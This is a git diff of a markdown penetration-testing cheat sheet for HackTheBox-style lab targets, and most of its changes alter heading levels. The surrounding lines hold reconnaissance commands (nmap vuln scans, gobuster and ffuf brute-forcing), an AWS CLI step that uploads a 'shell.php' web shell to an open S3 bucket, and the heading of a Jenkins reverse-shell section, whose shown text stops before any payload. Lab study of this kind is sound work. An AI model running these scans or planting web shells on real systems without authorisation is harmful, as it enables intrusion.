@@ -44,9 +44,10 @@ toc: true
 - **Import the agent for Ligolo and route the trafic .**
 - **Make sure you modify the Host file to have DC as Domain Name as well (Only DC)**
 
+
 # Enumeration :
 
-## Scanning :
+### Scanning :
 
 ```bash
 nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN Open_Ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v -oN Nmap_sV_sC_Results.txt && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN Nmap_Vuln_Results.txt 
@@ -65,7 +66,7 @@ ftp> passive off
 This will fix it . 
 ```
 
-## Services :
+### Services :
 
 **FTP :** 
 
@@ -86,7 +87,7 @@ This will fix it .
 
 # Web Application :
 
-## Crawling :
+### Crawling :
 
 ```bash
 burpsuite : it will automatically crawl all the application for us 
@@ -94,7 +95,7 @@ burpsuite : it will automatically crawl all the application for us
 Target / Site map . 
 ```
 
-## subdomains + directories :
+### subdomains + directories :
 
 ```java
 gobuster -w wordlist -u https://IP -K -x txt,html,php...
@@ -115,7 +116,7 @@ gobuster dir -u http://10.129.85.12 -w /usr/share/wordlists/seclists/Discovery/W
 ffuf -u http://conversor.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
 ```
 
-## AWS Commands :
+### AWS Commands :
 
 > In case we found AWS S3 buckets , we can interact with them .
 > 
@@ -132,7 +133,7 @@ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb : List content
 aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb : File upload
 ```
 
-## Jenkins Rev Shell :
+### Jenkins Rev Shell :
 
 ```bash
 Go to Script Console : 
